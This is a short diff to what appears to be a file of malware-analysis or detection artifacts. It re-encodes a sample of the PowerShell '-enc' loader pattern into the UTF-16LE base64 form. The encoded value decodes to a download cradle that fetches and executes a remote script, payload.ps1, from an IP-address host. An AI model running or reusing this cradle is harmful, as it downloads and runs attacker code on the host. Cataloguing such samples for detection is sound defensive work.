@@ -7,7 +7,7 @@
 # Context: found in Windows Sysmon EventID 1 (process creation), -enc flag.
 # This is the classic `powershell.exe -enc <base64>` loader pattern used by
 # commodity malware families (Emotet among them) — see PROVENANCE.md.
-PS_B64=aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcvcGF5bG9hZC5wczEnKQ==
+PS_B64=aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
 
 # --- ARTIFACT 2: URL-encoded path traversal ---
 # Context: found in a web server access log
